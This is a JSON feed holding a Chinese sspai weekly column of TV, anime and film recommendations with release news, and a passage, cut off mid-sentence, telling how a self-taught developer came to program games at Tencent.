[{"title":"本周看什么丨最近值得一看的 7 部作品","date":"2021-09-03 09:27:28","description":"\n<h2>☕️ TL;DR</h2>\n<ul>\n<li>近期佳作推荐：[美剧] 大楼里只有谋杀、[韩剧] D.P：逃兵追缉令、[动画] 魔法纪录 魔法少女小圆外传 第二季、[国产剧] 云南虫谷、 [美剧] 奇迹缔造者、[国产剧] 剩下的 11 个、[动画] 超 Q 特攻队</li>\n<li>几则精彩预告：本尼迪克特·康伯巴奇主演新片《犬之力》、道恩·强森、瑞恩·雷诺兹、盖尔·加朵主演新片《红色通缉令》11 月 12 日上线、山田尚子执导，TV 动画《平家物语》公布预告、《007：无暇赴死》发布国际版终极预告</li>\n<li>几则影视资讯：好莱坞科幻动作电影《明日之战》内地定档 9 月 3 日全国上映、《宝可梦：皮卡丘和可可的冒险》内地定档 9 月 10 日、电话诈骗犯罪片《Voice》发布海报，定档 9 月 15 日韩国上映、杰克·吉伦哈尔主演新片《罪人》定档 9 月 24 日北美上映</li>\n</ul>\n<h2>👀 N 部作品推荐</h2>\n<p>根据读者反馈，如果推荐语涉及剧透（对故事核心、暗线、伏笔、结局等关键要素的透露），我们会在对应作品的标题前增加 🔦 的 Emoji。</p>\n<p>如有其他建议也欢迎在评论区提出，感谢大家对「看什么」栏目的喜爱和支持。</p>\n<h3>[美剧] 大楼里只有谋杀</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/03/ff392b65e01a4b7d6a6a40abf0b53310.png\"></figure><p>关键词：喜剧 / 悬疑 / 惊悚 / 犯罪</p>\n<p>片长：30 分钟（单集）× 10 集；<a href=\"https://movie.douban.com/subject/35169965/\">豆瓣链接</a></p>\n<p>@宇宙浪费指南：《大楼里只有谋杀》由喜剧大师史蒂夫·马丁和约翰·霍夫曼联合创作，讲述三个「磕犯罪播客」的邻居，对自己所住大楼的谋杀案产生兴趣，想要去侦破罪案的故事，他们甚至自己做了一档犯罪播客，但随着调查深入，更多线索浮出水面，他们却突然发现自己被卷入其中。</p>\n<p>史蒂夫·马丁与马丁·肖特两位老戏骨的剧院风格和赛琳娜暗黑冷酷少女搭配在一起，丝毫没有违和感，反而增添了很多笑点。剧集虽然要素众多 —— 既有 Old New York 那种戏剧式的出演，又有希区柯克《后窗》式的悬疑，还有好似《美少女的谎言》中的暗黑少女，以及如《柯名斯基理论》中的两位老搭档的存在，各种要素互相适应的很好，这种奇异罕见的风格也让我们耳目一新。剧集并不是无时无刻在推理，偶尔的中二、无厘头桥段会让人放松警惕，不再把它当成一部纯粹的悬疑剧来看。</p>\n<p>从影视角度来说，该剧无论是配乐、色彩、悬疑感以及讲故事的手法都算得上精彩，九月开播的新剧里，这部还是值得一看的。</p>\n<h3>[韩剧] D.P：逃兵追缉令</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/03/f438b92ddb41c4902b47cc7bc2328be1.png\"></figure><p>关键词：剧情 / 动作 / 犯罪</p>\n<p>片长：55 分钟（单集）× 6 集；<a href=\"https://movie.douban.com/subject/35028876/\">豆瓣链接</a></p>\n<blockquote><p>我们，不能再做局外人了。</p></blockquote>\n<p>@潘誉晗：南韩征兵带来的社会问题由来已久，这次 Netflix 韩国出品的新剧也让民众的视线再次聚焦。故事讲述二等新兵安俊浩入伍之后被分编到了 D.P 小组，小组的主要任务是抓捕那些逃避兵役的人。而在执行任务的过程中，曾被兵长霸凌的安俊浩发现了那些逃兵身上不为人知的伤痛——逃避不是因为害怕吃苦，而是因为上司的体罚和辱骂。</p>\n<p>看完剧集，在反思之余就是狠狠羡慕韩国放送的自由度，虽然只有短短六集，但该剧还是赤裸裸地揭示了这一敏感的问题。如果有关注相关新闻的朋友，一定会记得那个在军队得了抑郁症后拿枪射杀自己战友的士兵，而士兵抑郁症背后的根源，以及藏在剧中那些逃兵逃避的真相，就是在军队中遭到了霸凌。曾出演过《机智牢房生活》的演员丁海寅在这部剧中的表现相当出色，开场那个冷峻清冽的眼神就很值得玩味，在网飞充满质感的昏黄的色调下，他也在明暗光线的交错中潜伏着、等待着，仿佛是在等待一个没有霸凌的美好明天。</p>\n<h3>[动画] 魔法纪录 魔法少女小圆外传 第二季</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/03/0f07b0a0c468c782717a040ee64535e7.png\"></figure><p>关键词：游戏改 / 剧情 / 奇幻 / 战斗</p>\n<p>片长：24 分钟（单集）× 8 集，每周六更新</p>\n<p>观看渠道：<a href=\"https://www.bilibili.com/bangumi/media/md28234642/\">哔哩哔哩</a>（有删改，延迟四周更新）；<a href=\"https://movie.douban.com/subject/35026036/\">豆瓣链接</a></p>\n<p>玩原作：<a href=\"https://apps.apple.com/jp/app/id1164785360\">iOS</a> / <a href=\"https://play.google.com/store/apps/details?id=com.aniplex.magireco\">Android</a> / <a href=\"https://game.bilibili.com/magireco/\">国服</a></p>\n<blockquote><p>和大家在一起，我就能拯救魔法少女！</p></blockquote>\n<p>@SHY：或许是因为《魔法少女小圆》确认推出正统续篇剧场版，手游改外传动画《魔法纪录》第二季的气场整个就不一样了。第一集融合游戏序章与支线剧情，让鹿目圆、晓美焰、美树沙耶香等几位老熟人闪亮登场，背景音乐一出，名台词名场景经典复刻，霸占整整 20 分钟，险些让人以为是正传第二季；再看后面的原作粉碎程度，一改第一季慢悠悠的单元剧路线，情节紧凑推进，叙事更加连贯。从承接前作尾声的七海八千代寻妻之路、与环彩羽的重逢，到 Magius 的真正谋划，一路突入「魔女之夜」，悬念与展开齐头并进，不留片刻歇息，剧团犬咖喱告诉我结局能直接连上《瓦尔普吉斯之回天》我都不会惊讶。</p>\n<p>不难看出，近年来状态低迷的 SHAFT 对本作相当重视，执导《魔法纪录》第一季开头与结尾集数的宫本幸裕正式统揽全局，一度退社的八濑佑树、高山克彦等人也回归担任关键职位。当然，最值得大书特书的是长田宽人惊艳的作画，第一集的动作戏几乎达到剧场版级别，另一位新人原画川田和树表现同样喜人，整体观感远强于前作。可惜的是，工期一向处于爆炸边缘的 SHAFT 还是没能保持住，第四集后的作画质量出现了明显下滑，分镜也略显凌乱，全靠演出糊弄过去。不过，对《魔法少女小圆》系列粉丝来说，兼具意境与情怀的本作依然不容错过，构建了「圆环之理」干涉外的另一种可能性。</p>\n<h3>[国产剧] 云南虫谷</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/03/c51381d2c6eaa11555927079c52ab7e5.png\"></figure><p>关键词：剧情 / 动作 / 冒险</p>\n<p>片长：37 分钟（单集）× 16 集</p>\n<p>观看渠道：<a href=\"https://v.qq.com/x/cover/mzc00200wk4wxlp.html\">腾讯视频</a>；<a href=\"https://movie.douban.com/subject/35042912/\">豆瓣链接</a></p>\n<blockquote><p>建议剧方建立一个主题公园，夏日纳凉好剧。</p></blockquote>\n<p>@潘誉晗：本剧的故事紧接着《龙岭迷窟》之后展开，胡八一和王胖子在 shirley 杨的解释下终于明白：原来身上的奇怪红斑源于扎格拉玛族的诅咒印记，如果不解除这个诅咒，三个人将命不久矣。因此，他们结伴前往云南，寻找传说中作为古滇国献王随葬品的雮尘珠。而擅长风水秘术并且性情残暴的献王，在自己的墓穴中设置了重重机关，阻止一切来到虫谷想要寻宝盗墓之人。</p>\n<p>因原版内容过于恐怖，回炉重造的《云南虫谷》终于开播了！由潘粤明、张雨绮和姜超组成的摸金三人组也再次集合探墓历险。因为尺度关系，剧方或多或少做了一些妥协，但还是尽可能地呈现出了古墓探险的刺激感。从水路进虫谷那段算是前期小高潮，人蛹变虫然后大战三人组那段拍得也是惊心动魄，看得出特效的制作是用了心的，虽然是网剧，可还是带来了很好的视听享受。铁三角的组合也很棒，胡八一和 shirley 杨之间的暧昧，王胖子「社交牛 X 症」带来的适度好笑，都给这部剧增加了不少的看点。</p>\n<h3>🔦 [美剧] 奇迹缔造者</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/03/c91af0fbf9534320dbd0adb1044297c7.png\"></figure><p>关键词：剧情 / 喜剧 / 奇幻</p>\n<p>片长：20 分钟（单集）× 13 集；<a href=\"https://movie.douban.com/subject/35234470/\">豆瓣链接</a></p>\n<p>@利兹与青鸟：本剧由丹尼尔·雷德克里夫主演，从 <a href=\"https://movie.douban.com/subject/27045850/\">第一季</a> 的天堂职场开始，到 <a href=\"https://movie.douban.com/subject/33447960/\">第二季</a> 的欧洲中世纪，第三季的故事来到了美国 19 世纪末 20 世纪初的西部拓荒时期。在第一季中饰演上帝的史蒂夫·布西密成了一个劫掠者小班尼，而曾经的卑微职场员工蛋妞则饰演了一位来自英格兰的牧师，同为第一季天堂职员饰演者的杰拉尔丁·维斯瓦纳坦和卡兰·索尼这次则分别成了贵妇人和赏金猎人。而本季的故事也在通缉犯小班尼带领牧师所在村庄的居民一起去俄勒冈展开。</p>\n<p>虽说是美剧，却处处体现着英式黑色幽默，和无厘头的美式幽默交织在一起难舍难分，梗量密集，让人啼笑皆非也让人笑而不语，既奇怪又可爱，暗讽了不少有关宗教、国家和社会的现象。原班人马却是完全不同故事的设定，不会给新观众造成观看门槛，但也会让看过前两季的观众觉得许多桥段非常有趣，比如牧师祈祷上帝赐予他向导时，门突然被打开，出现在光芒中的身影正是第一季饰演上帝的演员，当发现他这次饰演一个杀人抢劫的罪犯时，不免让人觉得制作组是在暗讽什么。</p>\n<p>主角的名字也非常有梗，比如牧师的名字 Ezekiel 可以指圣经中的以西结书，记载了以色列被掳到巴比伦的先知以西结看到的异象；贵妇人的名字 Prudence 则有「精明、慎重」的含义，而事实上也是如此，比起她什么都不会却自以为是的丈夫，Prudence 才是那个有学识的实干家。剧集每周二更新，预计将在 10 月 5 日完结，如果你也喜欢这种让人会心一笑的奇幻喜剧，三季连刷一定会收获更愉快的体验！</p>\n<h3>[国产剧] 剩下的 11 个</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/03/548318512a71709bd8d84fee19ce55b8.png\"></figure><p>关键词：科幻 / 悬疑</p>\n<p>片长：6 分钟（单集）× 6 集</p>\n<p>观看渠道：<a href=\"https://www.ixigua.com/6999890833436574244?utm_source=baidu_lvideo\">西瓜视频</a>；<a href=\"https://movie.douban.com/subject/35296323/\">豆瓣链接</a></p>\n<blockquote><p>欲望就是阿修罗。</p></blockquote>\n<p>@潘誉晗：剧集一开始的背景设定就很带感：2026 年，为了避免工业污染对城市的影响，全世界联合起来在太平洋的中心填海，并建立了一个无国界的工业生产区川元。紧接着，主角陈震宇出现 —— 一个破产的赌徒，靠着完成手机布置的任务赚取佣金生活。令人百思不得其解的是，这只手机仿佛像一个大门一样，开启了类似平行世界的副本，而且还有十一个长得和他一摸一样的人。</p>\n<p>本以为这是一部演员粉丝向的个人剧，看过后却颇为惊喜，国内第一部迷你剧的宣传口号并不只是噱头而已。虽然一集只有短短六分钟，但整体的悬疑氛围营造得很好，也正因为时长的关系，情节和台词毫不啰嗦，每一个出现的人物都似乎另有深意。神秘的社交软件到底是什么？陈震宇手中那个不离身的吊坠是不是暗藏了什么玄机？为什么会有一模一样的十二个人？另外几个人又会以什么形式出现？这些都令人非常好奇，期待后续。</p>\n<h3>[动画] 超 Q 特攻队</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/03/4e1c43930f2dba462fb67b0df58046c0.png\"></figure><p>关键词：动作 / 同性 / 奇幻 / 冒险</p>\n<p>片长：26 分钟（单集）× 10 集；<a href=\"https://movie.douban.com/subject/33400513/\">豆瓣链接</a></p>\n<blockquote><p>他们，只是想要一个表现自己的机会。</p></blockquote>\n<p>@潘誉晗：史蒂夫·玛丽威瑟在特工学校以全校第一的成绩毕业，当他作为代表在毕业典礼上发言的时候，因为公开出柜被守旧的上司派遣到西好莱坞，和一群同样是 LGBT 的特工们一起组成了一个不被看好的小团队。多讽刺啊，即使是在特工的世界中，只是因为他们的性取向没有和绝大多数人一样，就算能力超群，但依然不被看好。</p>\n<p>Netflix 这次打造的 LGBT 特工动画片的确是成人动画一个很棒的尝试。因为性取向在工作中受到阻挠并不只存在于影视作品中，因此主人公玛丽的积极向上就特别珍贵，就算被忽略了十年，他依然可以保有热情，带领着小团队不惜违抗上司为自己寻得一个机会。还有探员巴克的设定也很棒，直男巴克刚加入团队时对他们也是各种瞧不起，可随着一次次任务的执行，他明白了珍贵的友谊不应被性取向所影响。真希望大家可以像巴克这样不再因为「不一样」而歧视任何人。</p>\n<h3>更多</h3>\n<p><a href=\"https://movie.douban.com/subject/35559527/\">[日剧] 极工夫道</a> @SHY：《极主夫道》衍生短篇真人剧集，与原作剧情毫无联系，唯有一人一猫，与处理不尽的家务。在某户人家中，想要彻底贯彻家务之道的贤惠主夫津田健次郎，洗衣、做饭、修缮样样精通，眼里容不得一丝脏乱，总能将繁杂的生活料理得服服帖帖。不得不说，为动画版配音的津田叔与本作契合度极高，甚至比正牌日剧更还原，还能顺便学知识，精致又舒心。</p>\n<p><a href=\"https://www.bilibili.com/bangumi/play/ep409210\">[动画] 我，小怼</a><strong> </strong>@利兹与青鸟：山猫兄妹同名漫画改编，以一只会说话的胖胖街猫怼马为第一视角，讲述它和一位喜欢猫咪的爷爷（女性）相遇后一起生活的故事。画风别致，除了口嫌体直的大叔音（大塚明夫）猫咪欺负猫控爷爷（女性）的幽默主剧情，还点缀着不少猫视角下的温情瞬间。每周六更新，每集只有 1 分 30 秒，已经短到无法泡面了，不过非常适合等公交地铁的时候刷几集，如果觉得太短不过瘾，还可以去刷 18 话番外篇。</p>\n<p><a href=\"https://movie.douban.com/subject/35558650/\">[日剧] WE ARE ONE</a> @潘誉晗：为纪念《海贼王》漫画 100 卷和动画 1000 话的短篇剧集，讲述了关于四个读者的故事。剧集由蜷川实花担任导演，卡司阵容包括高良健吾、饭丰万理江、福士苍汰和柴田杏花，主题曲由 RADWIMPS 演唱。这是一部动漫粉看了会特爱的剧，因为无论你是什么职业的人，如果你追过《海贼王》，就一定会被漫画的热血所感动并为之振奋。</p>\n<p><a href=\"https://movie.douban.com/subject/35284255/\">[动画] 逗逗的日记</a> @SHY：《飞屋环游记》衍生短篇动画剧集，主角是宁可挨打也要上房揭瓦的狗子逗逗，与主人卡尔一同搬到新家后，每天在庭院中尽情胡闹，斗松鼠、领小狗，其乐无穷。破坏性工作之外，逗逗还凭自己的才智帮助扑灭了一起火灾，在结尾学会了分享食物，温馨而感人。卡尔的配音演员爱德华·阿斯纳已于 8 月 29 日逝世，这是他的最后一部影视作品，在此谨表哀悼，愿老爷子在天堂也有狗狗相伴。</p>\n<h2>📅 本周新预告</h2>\n<h3>本尼迪克特·康伯巴奇主演新片《犬之力》</h3> <p>本尼迪克特·康伯巴奇主演新片《犬之力》发布中文预告，入选第78届威尼斯电影节主竞赛单元，将于 12 月 1 日登陆 Neflix。该片改编自托马斯·萨维奇 1967 年发表的同名小说，曾凭借《钢琴课》获得戛纳金棕榈的新西兰女导演简·坎皮恩执导，讲述 1920 年代的美国一对性格迥异的农场兄弟的故事。</p>\n<h3>道恩·强森、瑞恩·雷诺兹、盖尔·加朵主演新片《红色通缉令》11 月 12 日上线</h3> <p>9 月 2 日，道恩·强森、瑞恩·雷诺兹、盖尔·加朵主演的新片《红色通缉令》发布首支预告。该片将于 11 月 12 日上线 Netflix。</p>\n<h3>山田尚子执导，TV 动画《平家物语》公布预告</h3> <p>9 月 3 日，TV 动画《平家物语》情报解禁，山田尚子执导，吉田玲子编剧，牛尾宪辅音乐，Science SARU 制作，悠木碧、樱井孝宏、早见沙织等声优参演，2022 年 1 月开始播出，9 月 15 日起上线流媒体。《平家物语》原著由信浓前司行长编纂，描绘平安时代末期平家的繁荣与衰落，与《源氏物语》并列为日本古典文学双壁。 <a href=\"https://twitter.com/heike_anime/status/1433595600876892186\">来源</a></p>\n<h3>《007：无暇赴死》发布国际版终极预告</h3> <p>9 月 1 日，丹尼尔·克雷格主演的《007：无暇赴死》发布国际版终极预告。蕾雅·赛杜、本·威士肖等主演回归，安娜·德·阿玛斯，拉什纳·林奇新晋加盟。该片将于 9 月 30 日英国上映，10 月 8 日北美上映。内地待定档。</p>\n<h3>更多</h3>\n<p><a href=\"https://weibo.com/tv/show/1034:4676909884440591\" target=\"_blank\"><strong>詹姆斯·麦卡沃伊主演《我的儿子》：</strong></a>影片讲述一对夫妻寻找失踪儿子的故事，将于 9 月 15 日上线 Peacock。为体现真实感，麦卡沃伊在表演前没有剧本，仅有大纲内容，他根据每场戏的发展即兴发挥。</p>\n<p><a href=\"https://www.bilibili.com/video/BV12P4y1p7ZC\" target=\"_blank\"><strong>《犯罪现场调查：维加斯》发布正式预告，10 月 6 日 CBS 开播：</strong></a>经典美剧《犯罪现场调查/CSI》续集《犯罪现场调查：维加斯》发布正式预告，宣布将于 10 月 6 日在 CBS 开播。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1FQ4y1a7GB\" target=\"_blank\"><strong>《达芬奇密码》系列改编新剧《失落的秘符》发布预告：</strong></a>《失落的秘符》发布预告，该剧由阿什利·祖克曼主演，改编自丹·布朗撰写的同名小说，讲述哈佛大学符号学家罗伯特·兰登（祖克曼饰）必须解决一系列致命难题，以解救被绑架的导师，并制止波及全球的阴谋。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1Tv411w7oc\" target=\"_blank\"><strong>宝可梦系列 25 周年纪念动画《宝可梦进化》公布预告：</strong></a>宝可梦公司公布了宝可梦系列诞生 25 周年纪念原创动画剧集《宝可梦进化》（Pokémon Evolutions），共 8 集，以迄今为止正传游戏中登场的 8 个主要地区为舞台，讲述其中鲜为人知的故事，将出现丹帝、莉莉艾等人气角色，第一集将于北京时间 9 月 9 日 22 点上线。</p>\n<p><a href=\"https://www.bilibili.com/video/BV12Q4y117WT?from=search&amp;seid=15351788843633553332&amp;spm_id_from=333.337.0.0\" target=\"_blank\"><strong>温子仁执导恐怖片《致命感应》发布新预告：</strong></a>由温子仁导演的 R 级恐怖新片《致命感应》发布正式预告，本片讲述麦迪森（安娜贝拉·沃丽丝饰）在梦中不断看到恐怖谋杀案现场的幻象的故事，将于 9 月 10 日北美上映，并同步上线 HBO Max。</p>\n<p><a href=\"https://www.bilibili.com/video/BV16q4y1U7Hf\" target=\"_blank\"><strong>漫改 TV 动画《擅长捉弄的高木同学》第三季 &amp; 动画电影：</strong></a>改编自山本崇一朗的同名漫画，新锐动画制作，讲述初中生高木和西片的恋爱故事，TV 动画 2022 年 1 月开始播出，剧场版 2022 年内上映。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1zq4y1K77L\" target=\"_blank\"><strong>漫改 TV 动画《最游记 RELOAD -ZEROIN-》：</strong></a>峰仓和也的漫画《最游记》开始连载 25 周年纪念企划，改编自「Even a worm」篇，LIDENFILMS 制作，2022 年 1 月开始播出。</p>\n<h2>📽 影视新闻周报</h2>\n<h3>好莱坞科幻动作电影《明日之战》内地定档 9 月 3 日全国上映</h3>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/03/b595187084d2072baf6a93e3144a9e8f.png\"></figure><p>电影《明日之战》发布手绘版海报和 <a href=\"https://www.bilibili.com/video/BV1KP4y1W7ET\">终极预告</a>，9 月 3 日全国上映。该片由克里斯·麦凯执导，「星爵」克里斯·帕拉特主演，对抗末日怪兽。</p>\n<h3>《宝可梦：皮卡丘和可可的冒险》内地定档 9 月 10 日</h3>\n<p>8 月 30 日，宝可梦系列最新剧场版动画《宝可梦：皮卡丘和可可的冒险》内地定档 9 月 10 日，并公布了定档预告、海报和导演寄语。本作由矢岛哲生执导，富冈淳广、矢岛哲生编剧，OLM 制作，小智和皮卡丘遇到了被宝可梦养大的孩子「可可」，他们将进入奥克雅森林一起寻找其中的秘密。</p> <h3>电话诈骗犯罪片《Voice》发布海报，定档 9 月 15 日韩国上映</h3>\n<p>韩国电话诈骗犯罪片《Voice》发布海报，宣布将于 9 月 15 日在韩国上映。该片由卞约汉和金武烈主演，讲述因电话诈骗失去一切的主角潜入中国组织的本部的故事。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/03/article/42fd8026803a84436ffffc62e19fcd46\"></figure><h3>杰克·吉伦哈尔主演新片《罪人》定档 9 月 24 日北美上映</h3>\n<p>8 月 30 日，电影《罪人》发布首款海报和 <a href=\"https://www.bilibili.com/video/BV1T64y1Y7iL\" target=\"_blank\">先导预告</a>，定档 9 月 24 日在北美院线上映，10 月 1 日上线 Netflix。 该片由安东尼·福奎阿执导，杰克·吉伦哈尔饰演一名紧急救援中心的接线员。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/03/article/c74c2bbc42bd380fcac35c7d0f36b11f\"></figure><h3>更多</h3>\n<p><strong>动画电影《机动战士高达 闪光的哈萨维》续集公布标题：</strong>三部曲系列的第二部，标题暂定为《机动战士高达 闪光的哈萨维 布莱德之子》，上映时间待定。 <a href=\"https://twitter.com/gundam_hathaway/status/1433417033471827970\" target=\"_blank\">来源</a></p>\n<p><strong>漫改 TV 动画《致不灭的你》第二季：</strong>改编自大今良时的同名漫画，村田雅彦执导，Brain's Base 制作，讲述拥有不灭之身的主人公「不死」经历的故事，2022 年秋季开始播出。 <a href=\"https://twitter.com/nep_fumetsu/status/1432346367213522945\" target=\"_blank\">来源</a></p>\n<p><strong>动画剧集《淑女拿破仑》：</strong>树林伸原作，秋田谷典昭执导，ZERO-G 制作，讲述拿破仑后裔索菲为统治世界而战的宏大动作幻想作品，第一季共 13 集，将独家上线 Netflix。 <a href=\"https://twitter.com/NetflixJP_Anime/status/1432614219355066372\" target=\"_blank\">来源</a></p>\n<p><strong>狮门影视和千禧传媒正式宣布《敢死队》电影开发中：</strong>本片由斯科特·沃执导，斯宾塞·科恩写剧本，主演杰森·斯坦森、杜夫·龙格尔、兰迪·库卓、史泰龙回归，50Cent、梅根·福克斯、托尼·贾新加盟，计划 10 月开拍。</p>\n<p><strong>惊悚片《算牌人》发布角色海报，9 月 10 日北美上映：</strong>9 月 1 日，由保罗·施拉德执导，马丁·斯科塞斯担任执行制片人，奥斯卡·伊萨克、蒂凡尼·哈迪斯、泰伊·谢里丹主演的新片《算牌人》发布角色海报。该片已入围第 78 届威尼斯电影节主竞赛单元，将于 9 月 10 日北美上映。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/03/article/a90ed093a2833d9f0f14e3b2de0c045d\"></figure><p><strong>段奕宏、大鹏主演剧集《双探》定档 9 月 9 日：</strong>由段奕宏、大鹏主演、曾美慧孜、郑楚一、张国强等人参演的剧集《双探》官宣定档 9 月 9 日。该剧由贾长安编剧，费聿竹、陈宙飞联合执导。讲述了一名刑警为追查小学生绑架案只身前往双塔，最终却卷入错综复杂的黑道三方势力关系网中的故事 。</p>\n<h2>🎪 彩蛋</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/03/d8d1a211ef7eb5ce02d15fc216fcc4d4.jpg\"></figure><p>本期彩蛋是由读者 <a class=\"ss-atUser\" data-mention=\"@从来没有岁月能长留\" user-id=\"bs2p325b34tch279laig\" href=\"https://sspai.com/u/oi1rpq88\">@从来没有岁月能长留</a> 提供的「电影推荐」，TA 为大家推荐了 TA 最喜欢的电影 ——《搏击俱乐部 Fight Club (1999)》。TA 说：「愿我们的明天都能成为一生中最美好的一天。」感谢 TA 对看什么栏目的喜爱，也恭喜 TA 获得了我们的不定期抽奖 —— 少数派周边一份。</p>\n<p>接下来是彩蛋的「猜电影」环节：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/03/75a8a86ef83793655ff28ac780c09bdf.jpg\"></figure><p>首位猜中片名的读者，可获得彩蛋提供名额 1 次（彩蛋内容包括但不限于「猜电影」「你喜欢的经典影视作品/影人/台词」「电影冷知识」），和我们不定期发放的奖品。本期猜中的「第一名」将会在这篇文章中更新，届时也请各位参与互动的朋友注意站内私信~</p>\n<p>🎬 你可能错过：<a href=\"https://sspai.com/post/68491\" target=\"_blank\">这 8 部欧美剧的原著，是你剧荒时的绝佳伴侣</a></p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现🚀</p>\n","link":"https://sspai.com/post/68600"},{"title":"怎么样的努力可以成为腾讯的游戏程序员？","date":"2021-09-03 09:22:56","description":"\n<p>没有科班经验，走过许多人生弯路，直到二十多岁的年纪决定重新开始，自学游戏开发技术，通过社招进入天美，这是我们身边同事阿升的故事。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-c0cab0f19dd765bfb8014425dcc4d32a_720w.jpeg?rss\" data-caption=\"\" data-size=\"small\" data-rawwidth=\"1000\" data-rawheight=\"751\" data-watermark=\"original\" data-original-src=\"v2-c0cab0f19dd765bfb8014425dcc4d32a\" data-watermark-src=\"v2-7737f4c0b893de18f8a7e689d4804845\" data-private-watermark-src=\"v2-a5a65f8feef00bfa156261c7944f24f4\"></p>\n<p>来到天美前，阿升因为喜欢《QQ飞车》，用了一年多时间，尝试独立开发一个移动版本，遇到种种困难，用了“最土的方法”去克服。后来在人生的低谷期，他写了一篇回顾性的博客，因此被项目组发掘，成为了一名正式的开发者。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ca102f36630bdae60c536f0a3db46351_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"292\" data-rawheight=\"29\" data-watermark=\"original\" data-original-src=\"v2-ca102f36630bdae60c536f0a3db46351\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>有人说他是自己见过“路子最野，学历最低”的程序员，面对弯路，他的态度或许像企微签名“疯狂漂移中...”一样，最终也殊途同归。</p>\n<p>经本人同意，我们转载了他撰写的博文，故事中有他犯过的错误，遇到的贵人，与努力的改正，希望对大家有所帮助。</p>\n<blockquote>注：原文较长，内容为可读性略有调整。</blockquote>\n<hr>\n<p>我在安徽出生，但在贵阳长大，因为个人原因，没有读过很多书，倒不是家里条件完全不允许，父母被气个半死拿我没辙。</p>\n<p>现在想起来，还是挺后悔的，多读书能少走很多弯路，只是那会儿不懂这个道理。</p>\n<p>无所事事了一段时间，跟家里关系也闹得很僵，后来大吵了一架，索性一个人跑去青岛找网友（男的，幸好不是坏人，好孩子也千万不要学）。</p>\n<p>身上只有几百块，憋着一口气不想回去啃老，也不想被亲戚看不起，就做各种零工赚钱。</p>\n<p>最难的时候几天吃不起饭，一桶水都喝光了，起床的力气都没有。床头柜上还有一星期前吃剩的馄饨汤，里面还有几片馄饨皮，闻了一下都有味道了。</p>\n<p>一咬牙，一口闷，这酸爽，够味！撑到朋友接济才挺了过来。</p>\n<p>我平时喜欢玩游戏，特别崇拜做游戏的人，感觉他们很牛，能把那么多好看的画面放到屏幕上，你还能控制它们。</p>\n<p>当时我认识一个游戏金团的人，在他的介绍下给他们打工刷装备，第一次知道了这些灰色产业。团里有人在用插件，是一种辅助工具，我什么都不懂，但背后的原理让我感到很好奇，觉得跟做游戏很像，电脑技术都很厉害！</p>\n<p>我动了学编程的念头，以前好像怎么都读不进书，但可能兴趣是最好的老师，忽然就开窍了。</p>\n<p>我泡在各种贴吧论坛，在网上一个词一个词地查，学了点散装的编程知识，试着自己上手改良和开发，当然没那么顺利，较劲一定要弄出来，折腾久了也算稍微懂了。</p>\n<p>金团效率高了，给我多发了点钱。中间我回了趟家，给我妈买了一只口红，给我爸买了一条中华，他们都很高兴，不是因为买了东西，而是因为儿子回来了。</p>\n<p>我觉得自己能挣钱了，变膨胀了，花钱大手大脚，还交友不慎。</p>\n<p>灰产终究是灰产，每个人都很急功近利，因为谁也不知道下一秒就会发生什么。一连串的变故很快发生，金团倒了，钱也没了，跟曾经信任的“朋友”打了一架，彻底撕破脸。</p>\n<p>现在回过头看，其实也是好事，让我从歧途中走了出来，而不是继续错下去。</p>\n<p>但在那一年，似乎我拥有的一切都消失了...... 我又陷入了一事无成的迷茫。</p>\n<p>舞房的朋友接纳了我，让我住在舞房，跟他们吃住一起，有小课叫我代代课，一节课下来给我一百来块钱。</p>\n<p>那阵子浑浑噩噩的，没课的时候就把头闷被窝里睡一天，电脑也不会去打开，晚上没事就跟朋友去酒吧喝酒。</p>\n<p>一个月下来，我在苏州的朋友过来玩，看见我说感觉我变了一个人，都不敢认我，外观也变化太大。很邋遢，面色蜡黄，胡子拉碴的，头发没有洗，乱七八糟的。</p>\n<p>过年回了趟家，不知道为什么，过完年我又回来了，继续住在舞房，继续堕落。潜意识是在躲避着什么，一直走不出来。</p>\n<p>朋友介绍我去大学教大学生跳舞，认识了一群不错的小伙子，练舞肯吃苦，想法也没有社会上的人那么复杂。</p>\n<p>我开始喜欢和他们混在一起，其实我年龄跟他们一样大，有些人比我还大。喜欢跟他们在一起我想不是因为年龄的原因，是因为他们阳光，热情。</p>\n<p>我长得显老，他们以为我比他们大，都叫我升哥。跟他们在一起半年，我走出来了，看开了，之前的事都过去了，在新的一年，我会重新来过。</p>\n<p>我终于又重新打开电脑了。</p>\n<p>我把以前的一切都删了。嫌麻烦，干脆直接重新装个系统，全盘格式化。我想做游戏，我的初心是做游戏啊！为什么我现在才醒悟过来，真是当局者迷。</p>\n<p>我以前有个志同道合的朋友，后来当.NET程序员了。</p>\n<p>听他说投腾讯简历直接被扔了！原因是要么学历不够，要么不需要.NET程序员。</p>\n<p>这小子不知道哪儿来的自信，其实我